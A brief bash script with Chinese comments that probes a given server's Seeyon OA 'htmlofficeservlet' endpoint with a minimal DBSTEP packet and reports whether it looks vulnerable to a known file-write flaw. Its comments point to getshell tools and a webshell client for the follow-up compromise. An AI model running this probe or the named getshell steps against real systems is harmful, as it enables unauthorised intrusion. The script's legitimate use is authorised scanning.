#!/usr/bin/env bash
# 只做"协议探测"：验证 htmlofficeservlet 是否存在且解析 DBSTEP
TARGET="${1:?usage: bash seeyon.sh http://TARGET:PORT}"
B="${TARGET%/}"
# 最小 DBSTEP 头（不写文件）：字段顺序 filename/offset/size/...
printf 'DBSTEP V3.0     0               0               0\n' > runs/seeyon-probe.bin
curl -sS -m 12 -X POST "$B/seeyon/htmlofficeservlet" \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @runs/seeyon-probe.bin -o runs/seeyon-resp.txt -w 'http=%{http_code}\n'
grep -qiE 'DBSTEP|OPTION' runs/seeyon-resp.txt && echo "VULN 协议可达（可进一步构造写入）" || echo "SAFE/未命中"
# 完整写入需要构造带 filename/size 的 DBSTEP 报文（长度字段必须与实际内容一致），
# 现成工具：seeyon_exp / 各类 A8 getshell 脚本；写入后再用冰蝎实测连接。
